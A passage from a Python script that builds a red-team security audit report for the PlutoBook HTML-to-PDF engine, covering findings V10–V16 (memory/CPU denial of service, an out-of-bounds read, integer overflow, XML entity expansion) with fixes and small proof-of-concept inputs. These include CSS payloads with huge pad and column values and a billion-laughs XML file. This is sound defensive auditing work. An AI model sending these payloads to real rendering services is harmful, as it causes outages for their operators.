 },
 fix="""<p>Two complementary guards: (1) in <code>PageLayout::layout()</code>
 (<code>source/layout/pagebox.cpp</code>), the result of <code>ceil(height/containerHeight)</code> is
 computed as a <code>double</code> and clamped to a finite value <code>&le; UINT32_MAX</code> before
 the conversion to <code>uint32_t</code> (avoids UB if the input produces an astronomical
 height/ratio); (2) the <code>Counters::Counters(Document*, uint32_t pageCount)</code> constructor
 (<code>source/counters.cpp</code>) then clamps that count to the configurable cap -- the
 <code>PageBox</code>-building loop reads <code>counters.pageCount()</code>, so this single point is
 enough to bound both the number of pages actually built and the <code>pages</code> counter exposed
 to <code>counter(pages)</code> ("Page X of Y" numbering in page margins).</p>
 <p><em>Known limitation, out of scope</em>: while verifying this fix, a pre-existing, unrelated
 defect was found in PDF writing (Cairo 1.18.4 library): beyond 65536 total pages in a single
 document, the produced PDF file becomes unreadable (corrupted trailer/xref, same observation under
 <code>poppler</code> and <code>ghostscript</code>), reproducible both on unmodified code (at a
 controlled page count, unrelated to V09) and on this fix. The <code>maxPageCount=100000</code>
 default below is above that threshold: a document that actually reaches the cap can therefore
 produce a corrupt PDF rather than a valid one (but the process itself does not crash and does not
 consume unbounded memory -- V09's memory/UB goal is met). Fixing PDF writing itself is out of scope
 for V09 (a separate bug, on the Cairo/PDF serialization side, not pagination/conversion) -- a
 candidate for a future dedicated fix.</p>""",
 config="Configurable cap via <code>EngineLimits::setMaxPageCount</code> (default 100000 pages, <code>0</code> = unlimited -- not recommended); C API <code>plutobook_set_max_page_count</code>.",
 status="done",
)

add(
 id="V10", slug="V10-counter-pad", severity="moyenne+", cat="Memory DoS",
 title="@counter-style pad / additive: multi-GB string",
 keyfile="source/cssrule.cpp:855-878",
 locations=[
   ("source/cssparser.cpp:4711-4724", "consumeCounterStylePad accepts an unbounded integer"),
   ("source/cssrule.cpp:855-878", "representation += padSymbol loop"),
   ("source/cssrule.cpp:766-768", "additive variant: repetitions = value / weight"),
 ],
 nature="""<p><code>pad: 2000000000 "x"</code> makes <code>representation += padSymbol</code> loop up to
 ~2 billion times; the string is then copied into the Heap. A similar additive variant exists via
 unbounded <code>counter-increment</code> and <code>additive-symbols: 1 "x"</code>.</p>""",
 risk="<p><strong>Impact</strong>: ~GB string &rarr; OOM.</p>",
 repro=["Render poc/repro.html &rarr; a giant string gets built."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
  @counter-style boom { system: numeric; symbols: "0" "1"; pad: 2000000000 "x"; }
  li { list-style: boom; }
</style></head><body><ol><li>a</li></ol></body></html>
""",
 },
 fix="""<p>Both generation loops (<code>CSSCounterStyle::generateRepresentation</code> for
 <code>pad</code>, <code>CSSCounterStyle::generateInitialRepresentation</code> for the
 <code>additive</code> system) stop appending symbols to the representation being built as soon as
 it reaches <code>EngineLimits::maxCounterLength()</code>, instead of continuing up to the raw value
 (potentially ~2 billion) requested by the CSS. For the additive branch, the subtraction
 <code>value -= repetitions * weight</code> is still performed as an integer operation on the full
 value (O(1) cost, no memory impact) so the additive system's "exact representation or fail"
 algorithm keeps working correctly; only the string's growth is capped.</p>""",
 config="""New <code>EngineLimits::maxCounterLength</code> limit (<code>setMaxCounterLength</code> /
 <code>maxCounterLength()</code>), <strong>default 100000</strong> characters, <code>0</code> =
 unlimited (not recommended). C API <code>plutobook_set_max_counter_length(unsigned int)</code>.
 Verified: <code>pad: 2000000000 "x"</code> and an additive variant
 (<code>additive-symbols: 1 "x"</code> + a 2-billion <code>counter-increment</code>) each produce a
 representation bounded to exactly 100000/100001 characters (measured directly) instead of ~2
 billion, rendered in &lt;0.15s instead of an OOM; a lowered cap via a test harness (e.g. 5/10/50)
 bounds the representation accordingly.""",
 status="done",
)

add(
 id="V11", slug="V11-stb-stride", severity="moyenne", cat="Out-of-bounds read",
 title="stb&rarr;cairo over-read (wrong source stride)",
 keyfile="source/resource/imageresource.cpp:169-190",
 locations=[
   ("source/resource/imageresource.cpp:175", "src = imageData + surfaceStride*y (imageData is packed width*4)"),
 ],
 nature="""<p><code>imageData</code> returned by stb is packed (<code>width*4</code> bytes/row) but is
 indexed using <em>cairo's stride</em>. If cairo pads the stride beyond <code>width*4</code> (SIMD
 alignment), rows with <code>y&gt;0</code> read past the end of the stb buffer.</p>""",
 risk="""<p><strong>Impact</strong>: heap over-read (info leak into the rendering / crash). Latent on the
 common Linux cairo build where <code>stride == width*4</code> for ARGB32; active on a cairo build with
 aligned strides.</p>""",
 repro=["Render an image that goes through stb (e.g. BMP/GIF) whose width makes width*4 not a multiple of cairo's alignment, on a cairo build with aligned strides."],
 poc={
  "make-bmp.py": """#!/usr/bin/env python3
# Small 24-bit BMP with an 'odd' width, to exercise the stb path.
import struct
W, H = 13, 4
row = (b"\\x10\\x20\\x30")*W
pad = (-len(row)) % 4
data = b"".join(row + b"\\x00"*pad for _ in range(H))
off = 54
bmp = b"BM" + struct.pack("<IHHI", off+len(data), 0, 0, off)
bmp += struct.pack("<IiiHHIIiiII", 40, W, H, 1, 24, 0, len(data), 2835, 2835, 0, 0)
open("odd.bmp","wb").write(bmp + data)
print("odd.bmp written")
""",
 },
 fix="""<p>New <code>imageStride = width * 4</code> variable (stb always produces 4 bytes/pixel via
 <code>STBI_rgb_alpha</code>, with no padding), used to advance <code>src</code> row by row;
 <code>dst</code> still advances by <code>surfaceStride</code> (the real, possibly padded, cairo
 buffer stride). The alpha premultiplication logic is unchanged.</p>""",
 config="""<p>Pure fix (no knob).</p>
 <p><em>Verification</em>: replayed under ASan (<code>meson setup build-asan -Db_sanitize=address</code>)
 with BMP/GIF images of varied widths (1 to 257px, including ones not a multiple of 4/16/32) going
 through the stb path &mdash; no errors, correct output (expected non-transparent pixels present). On
 this system, the cairo function <code>cairo_format_stride_for_width(ARGB32, w)</code> always returns
 exactly <code>w*4</code> (checked for w=1..20): the stride is never padded, so the bug remains
 <strong>latent</strong> on this particular build and ASan cannot trigger the over-read through the
 full pipeline here. The fix's logic was independently verified with an isolated harness reproducing
 the exact indexing pattern (an exactly-sized packed stb buffer + an artificially simulated "cairo"
 stride larger than <code>width*4</code>): the unfixed indexing (indexing <code>src</code> by the
 enlarged stride) triggers a clean ASan <code>heap-buffer-overflow</code> read right at the packed
 buffer's boundary; the fixed indexing (via <code>imageStride</code>) runs with no errors. This
 confirms the fix is correct for any cairo build that would actually pad the ARGB32 stride beyond
 <code>width*4</code>.</p>""",
 status="done",
)

add(
 id="V12", slug="V12-column-count", severity="moyenne", cat="CPU DoS",
 title="Unbounded column-count: multi-billion iteration loop",
 keyfile="source/layout/multicolumnbox.cpp:304-313",
 locations=[
   ("source/cssparser.cpp:1479-1486", "consumePositiveInteger: min 1, no max"),
   ("source/layout/multicolumnbox.cpp:304-313", "O(runs) loop per iteration"),
 ],
 nature="<p><code>columns:2000000000</code> triggers an <code>O(runs)</code>-per-iteration loop over billions of iterations.</p>",
 risk="<p><strong>Impact</strong>: CPU hang (DoS). No per-column allocation on this path.</p>",
 repro=["Render poc/repro.html &rarr; endless loop."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
  div { columns: 2000000000; }
</style></head><body><div>a b c d e</div></body></html>
""",
 },
 fix="""<p><code>BoxStyle::columnCount()</code> (the single point that converts the parsed CSS
 <code>column-count</code> value into the int used by multicolumn layout, called from
 <code>MultiColumnFlowBox::computeWidth</code> and <code>computePreferredWidths</code>) clamps the
 parsed value to <code>EngineLimits::maxColumnCount()</code> before returning it, instead of leaving
 it as-is (potentially ~2 billion). The minimum of 1 already guaranteed by
 <code>consumePositiveInteger</code> (shared with <code>widows</code>/<code>orphans</code>, so left
 untouched) is unchanged. The <code>O(runs)</code> loop in
 <code>MultiColumnRowBox::distributeImplicitBreaks</code> can then no longer exceed this iteration
 cap.</p>""",
 config="""New <code>EngineLimits::maxColumnCount</code> limit (<code>setMaxColumnCount</code> /
 <code>maxColumnCount()</code>), <strong>default 1000</strong>, <code>0</code> = unlimited (not
 recommended). C API <code>plutobook_set_max_column_count(unsigned int)</code>. Verified:
 <code>columns:2000000000</code> goes from a hang (&gt;8s, killed by timeout, no valid PDF) to
 rendering in ~0.05s (valid PDF) once the cap is applied; <code>columns:3</code> over a text block
 still produces a correct 3-column render (non-regression); a lowered cap via a test harness (C API,
 e.g. maxColumnCount=1/5) reduces the number of columns actually used accordingly, measured
 indirectly via the page count produced for the same content.""",
 status="done",
)

add(
 id="V13", slug="V13-integer-ub", severity="basse", cat="UB / robustness",
 title="Integer overflow in numeric parsing",
 keyfile="source/htmldocument.cpp:224",
 locations=[
   ("source/htmldocument.cpp:224-233", "output = output*10 + digit (signed UB for <li value>/<ol start>)"),
   ("source/csstokenizer.cpp:289", "int exponent: 1e99999999"),
   ("source/svgproperty.cpp:130", "SVG int exponent"),
   ("source/htmlentityparser.cpp:2479-2510", "numeric reference &#... (clamped to U+FFFD, memory-safe)"),
 ],
 nature="<p>Uncapped <code>output = output*10 + digit</code> accumulation: signed UB for signed attributes, unsigned wraparound elsewhere; overflowable <code>int</code> exponents. Character references are clamped to U+FFFD (so they are memory-safe).</p>",
 risk="<p><strong>Impact</strong>: UB / nonsensical values; contributes to V06/V09. Low severity on its own.</p>",
 repro=["Render poc/repro.html (huge numeric values)."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body>
  <ol start="9999999999999999999"><li>a</li></ol>
  <p>&#99999999999999999999;</p>
</body></html>
""",
 },
 fix="<p>Checked accumulation + range clamp.</p>",
 config="Robustness fix (no dedicated knob).",
 status="done",
)

add(
 id="V14", slug="V14-decoder-returns", severity="basse", cat="Robustness",
 title="Unchecked turbojpeg/webp return values + untested malloc",
 keyfile="source/resource/imageresource.cpp:110-123",
 locations=[
   ("source/resource/imageresource.cpp:115", "tjDecompress2 return value ignored"),
   ("source/resource/imageresource.cpp:118-119", "std::malloc not checked before memcpy"),
 ],
 nature="<p>The return value of <code>tjDecompress2</code> is ignored, and the <code>std::malloc</code> for the retained JPEG blob is not checked before <code>memcpy</code>.</p>",
 risk="<p><strong>Impact</strong>: crash/DoS on allocation failure (amplified by V04).</p>",
 repro=["Provide a malformed/huge JPEG and observe the unchecked path (under ASan)."],
 poc={
  "note.md": "Reliably reproduced via a truncated JPEG + an ASan build. See V05 for a large-image generator.\n",
 },
 fix="<p>Check every decoder return value and the <code>malloc</code> before use.</p>",
 config="Robustness fix.",
 status="done",
)

add(
 id="V15", slug="V15-assert-bounds", severity="basse", cat="Robustness (latent)",
 title="Bounds/downcasts validated only by assert",
 keyfile="source/csstokenizer.h:239-286",
 locations=[
   ("source/csstokenizer.h:239-286", "CSSTokenizerInputStream: bounds checked only via assert"),
   ("source/pointer.h:227-236", "to<T>(): assert(is<T>()) then static_cast"),
   ("source/layout/tablebox.h:278,288", "structural casts assuming the tree invariant"),
 ],
 nature="<p>Under <code>NDEBUG</code> (release), <code>assert</code> statements vanish: <code>m_offset</code> drift and <code>to&lt;T&gt;()</code> downcasts become unchecked <code>static_cast</code>s. No proven bug yet, but a fuzzing target worth pursuing (type confusion on table casts).</p>",
 risk="<p><strong>Potential impact</strong>: type confusion &rarr; memory corruption if some fixup path leaves a non-conforming child.</p>",
 repro=["Fuzz the public entry point under ASan/UBSan with malformed table trees (V06/V07)."],
 poc={
  "note.md": "High-priority fuzzing target. Build a libFuzzer harness on the public entry point (loadHtml) under ASan/UBSan.\n",
 },
 fix="<p>Replace bounds <code>assert</code>s on hot paths with active checks in release builds; harden the downcasts.</p>",
 config="Robustness fix.",
 status="done",
)

add(
 id="V16", slug="V16-expat-billion-laughs", severity="info", cat="Info / dependency",
 title="XML billion-laughs protection depends on the expat version",
 keyfile="meson.build:8-11",
 locations=[
   ("meson.build:8-11", "dependency('expat', fallback: ...) prefers the system expat"),
   ("source/xmlparser.cpp:45-64", "no external entity handler (XXE unreachable)"),
 ],
 nature="""<p><strong>Good news</strong>: no <code>XML_SetExternalEntityRefHandler</code> or
 <code>XML_SetParamEntityParsing</code> &rarr; <em>XXE is unreachable</em>. But <code>meson.build</code>
 prefers the <em>system</em> expat; billion-laughs protection (internal entity expansion) therefore
 depends on the version (protected by default from expat 2.4.0 onward; the bundled fallback 2.7.3 is).</p>""",
 risk="<p><strong>Impact</strong>: memory DoS via entity expansion if the host provides an expat &lt; 2.4.0.</p>",
 repro=["Render poc/lol.xml with an expat < 2.4.0."],
 poc={
  "lol.xml": """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
""",
 },
 fix="<p>Pin/verify expat &ge; 2.4.0, or explicitly set <code>XML_SetBillionLaughsAttackProtectionMaximumAmplification</code>.</p>",
 config="Minimum expat version enforced in the build.",
)

# ---------------------------------------------------------------------------
# HTML rendering
# ---------------------------------------------------------------------------
CSS = """/* PlutoBook security audit report - shared stylesheet */
:root{--bg:#fff;--fg:#1a1a1a;--muted:#666;--card:#f6f7f9;--border:#e2e5ea;--code:#f0f2f5;
  --link:#0b62d6;--crit:#c62828;--high:#e65100;--medhigh:#ef6c00;--med:#f9a825;--low:#1565c0;--info:#607d8b;}
@media (prefers-color-scheme:dark){:root{--bg:#14171c;--fg:#e6e8eb;--muted:#9aa4b0;--card:#1b1f26;
  --border:#2a2f38;--code:#0f1319;--link:#5aa0ff;}}
:root[data-theme=dark]{--bg:#14171c;--fg:#e6e8eb;--muted:#9aa4b0;--card:#1b1f26;--border:#2a2f38;--code:#0f1319;--link:#5aa0ff;}
:root[data-theme=light]{--bg:#fff;--fg:#1a1a1a;--muted:#666;--card:#f6f7f9;--border:#e2e5ea;--code:#f0f2f5;--link:#0b62d6;}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);
  font:16px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}
.wrap{max-width:960px;margin:0 auto;padding:2rem 1.25rem 4rem}
h1{font-size:1.9rem;margin:.2rem 0 .4rem}h2{font-size:1.3rem;margin:2rem 0 .6rem;border-bottom:1px solid var(--border);padding-bottom:.3rem}
h3{font-size:1.05rem;margin:1.4rem 0 .4rem}
a{color:var(--link)}code{background:var(--code);padding:.1em .35em;border-radius:4px;font-size:.9em;
  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
pre{background:var(--code);border:1px solid var(--border);border-radius:8px;padding:.9rem 1rem;overflow-x:auto}
pre code{background:none;padding:0}
.muted{color:var(--muted)}
.lead{color:var(--muted);font-size:1.05rem}
table{border-collapse:collapse;width:100%;margin:1rem 0;font-size:.94rem;display:block;overflow-x:auto}
th,td{border:1px solid var(--border);padding:.5rem .6rem;text-align:left;vertical-align:top}
th{background:var(--card)}
tr:hover td{background:var(--card)}
.badge{display:inline-block;padding:.12em .6em;border-radius:999px;color:#fff;font-size:.78rem;font-weight:600;white-space:nowrap}
.sev-crit{background:var(--crit)}.sev-high{background:var(--high)}.sev-medhigh{background:var(--medhigh)}
.sev-med{background:var(--med);color:#222}.sev-low{background:var(--low)}.sev-info{background:var(--info)}
.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem 1.2rem;margin:1rem 0}
.kv{margin:.2rem 0}.kv b{display:inline-block;min-width:130px;color:var(--muted);font-weight:600}
.crumb{font-size:.9rem;margin-bottom:1rem}
.status-todo{color:var(--high);font-weight:600}.status-done{color:#2e7d32;font-weight:600}
ol.steps li{margin:.3rem 0}
footer{margin-top:3rem;color:var(--muted);font-size:.85rem;border-top:1px solid var(--border);padding-top:1rem}
.toggle{float:right;font-size:.8rem;border:1px solid var(--border);border-radius:6px;padding:.2rem .5rem;cursor:pointer;background:var(--card);color:var(--fg)}
"""

THEME_JS = """<script>
(function(){var t=localStorage.getItem('pb-theme');if(t)document.documentElement.setAttribute('data-theme',t);
document.addEventListener('DOMContentLoaded',function(){var b=document.getElementById('tg');if(!b)return;
b.onclick=function(){var d=document.documentElement,c=d.getAttribute('data-theme')==='dark'?'light':'dark';
d.setAttribute('data-theme',c);localStorage.setItem('pb-theme',c);};});})();
</script>"""

def page(title, body, css_path="assets/style.css"):
    title_txt = html.escape(html.unescape(title), quote=True)
    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title_txt}</title>
<link rel="stylesheet" href="{css_path}">
{THEME_JS}
</head><body><div class="wrap">
<button class="toggle" id="tg">theme</button>
{body}
<footer>PlutoBook &mdash; red-team security audit. Static report generated for human reading.
Threat model: untrusted input (server-side rendering of arbitrary HTML/SVG/CSS).</footer>
</div></body></html>
"""

# --- Root index ---
rows = ""
for f in F:
    label, cls = SEV[f["severity"]]
    rows += f"""<tr>
<td><a href="{f['slug']}/">{f['id']}</a></td>
<td><a href="{f['slug']}/">{f['title']}</a></td>
<td><span class="badge {cls}">{label}</span></td>
<td>{esc(f['cat'])}</td>
<td><code>{esc(f['keyfile'])}</code></td>
<td>{status_html(f)}</td>
</tr>\n"""

counts = {}
for f in F: counts[f["severity"]] = counts.get(f["severity"],0)+1
summary = " &middot; ".join(f'<span class="badge {SEV[s][1]}">{counts[s]} {SEV[s][0]}</span>'
                            for s in ["critique","haute","moyenne+","moyenne","basse","info"] if s in counts)

root_body = f"""<h1>PlutoBook &mdash; Security Audit Report</h1>
<p class="lead">Red-team audit of the HTML/XML/CSS/SVG &rarr; PDF rendering engine. {len(F)} findings,
ranked by severity.</p>
<p>{summary}</p>

<div class="card">
<h3 style="margin-top:0">Executive summary</h3>
<p>PlutoBook is robust against direct parser memory bugs (<code>std::string</code>/<code>vector</code>
buffers, bounded lookahead) and well protected against XXE. But it was designed for
<em>trusted input</em>, whereas its promoted use case is server-side rendering of arbitrary HTML. Under
this threat model, it entirely lacks a <strong>security policy layer</strong> (scheme allowlist, address
filtering, URL validation) and any <strong>budget</strong> (size, depth, pixels, count) in the
parse &rarr; layout pipeline.</p>
<p><strong>Cross-cutting amplifier</strong>: the PMR Heap has a no-op <code>operator delete</code>
(<code>heapstring.h:88</code>) &mdash; nothing is freed before rendering finishes, so every OOM below
is unrecoverable.</p>
</div>

<h2>Findings (by severity)</h2>
<table>
<thead><tr><th>ID</th><th>Title</th><th>Severity</th><th>Class</th><th>Key file</th><th>Status</th></tr></thead>
<tbody>
{rows}</tbody>
</table>

<h2>Severity legend</h2>
<p>
<span class="badge sev-crit">Critical</span> directly exploitable (SSRF, file read) &mdash;
<span class="badge sev-high">High</span> reliable DoS / RCE surface &mdash;
<span class="badge sev-medhigh">Medium+</span> DoS + UB &mdash;
<span class="badge sev-med">Medium</span> latent over-read / CPU DoS &mdash;
<span class="badge sev-low">Low</span> UB / robustness &mdash;
<span class="badge sev-info">Info</span> dependency / posture.
</p>
<p class="muted">See also <code>FIX-GUIDE.md</code> (fix implementation guide) and
<code>PROGRESS.md</code> (progress log).</p>
"""

(ROOT / "assets").mkdir(parents=True, exist_ok=True)
(ROOT / "assets" / "style.css").write_text(CSS)
(ROOT / "index.html").write_text(page("PlutoBook - Security Audit", root_body))

# --- Finding pages + PoCs ---
for f in F:
    label, cls = SEV[f["severity"]]
    locs = "".join(f"<li><code>{esc(l)}</code> &mdash; {esc(d)}</li>" for l,d in f["locations"])
    steps = "".join(f"<li>{s}</li>" for s in f["repro"])
    pocfiles = ""
    for fn in f["poc"]:
        pocfiles += f'<li><code>poc/{esc(fn)}</code></li>'
    body = f"""<div class="crumb"><a href="../">&larr; All findings</a></div>
<h1>{f['id']} &middot; {f['title']}</h1>
<p><span class="badge {cls}">{label}</span> &nbsp; <span class="muted">{esc(f['cat'])}</span></p>
<div class="card">
<div class="kv"><b>Status</b> {status_html(f)}</div>
<div class="kv"><b>Key file</b> <code>{esc(f['keyfile'])}</code></div>
</div>

<h2>Nature</h2>
{f['nature']}

<h2>Location</h2>
<ul>{locs}</ul>

<h2>Risk &amp; impact</h2>
{f['risk']}

<h2>Reproduction</h2>
<ol class="steps">{steps}</ol>
<p class="muted">Example files:</p>
<ul>{pocfiles}</ul>

<h2>Proposed fix</h2>
{f['fix']}

<h2>Configuration (default + configurable)</h2>
<p>{f['config']}</p>
"""
    d = ROOT / f["slug"]
    (d / "index.html").write_text(page(f"{f['id']} - {f['title']}", body, css_path="../assets/style.css"))
    pdir = d / "poc"; pdir.mkdir(parents=True, exist_ok=True)
    for fn, content in f["poc"].items():
        (pdir / fn).write_text(content)

print(f"Generated: {len(F)} findings + index + css")
for f in F: print(" ", f["id"], f["slug"], f["severity"])
